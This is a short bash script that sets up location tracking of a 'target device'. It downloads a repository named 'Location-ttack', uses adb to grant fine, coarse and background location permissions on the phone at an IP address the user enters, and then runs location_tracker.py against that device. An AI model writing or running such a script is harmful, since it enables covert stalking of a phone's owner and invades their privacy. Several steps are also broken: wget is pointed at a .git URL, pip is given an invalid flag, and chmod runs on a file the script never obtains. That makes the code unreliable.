#!/bin/bash

# Install Python and pip
sudo apt-get install python3-pip -y

# Install the required dependencies
pip3 install android -y

# Check for errors and handle them
if [ $? -ne 0 ]; then
    echo "Error installing the required dependencies."
    exit 1
fi

# Download the script
wget https://github.com/Aadi1601/Location-ttack.git
# Grant permissions to the script
chmod +x location_tracker.py

# Check for errors and handle them
if [ $? -ne 0 ]; then
    echo "Error granting permissions to the script."
    exit 1
fi

# Prompt for the target device IP address
read -p "Enter the IP address of the target device: " ip_address

# Get the device ID
device_id=$(adb devices | grep $ip_address | awk '{print $1}')

# Grant permissions to the target device
adb -s $device_id shell pm grant com.android.providers.location android.permission.ACCESS_FINE_LOCATION
adb -s $device_id shell pm grant com.android.providers.location android.permission.ACCESS_COARSE_LOCATION
adb -s $device_id shell pm grant com.android.providers.location android.permission.ACCESS_BACKGROUND_LOCATION

# Check for errors and handle them
if [ $? -ne 0 ]; then
    echo "Error granting permissions to the target device."
    exit 1
fi

# Run the script
python3 location_tracker.py $device_id

# Check for errors and handle them
if [ $? -ne 0 ]; then
    echo "Error running the script."
    exit 1
fi

echo "Script executed successfully."
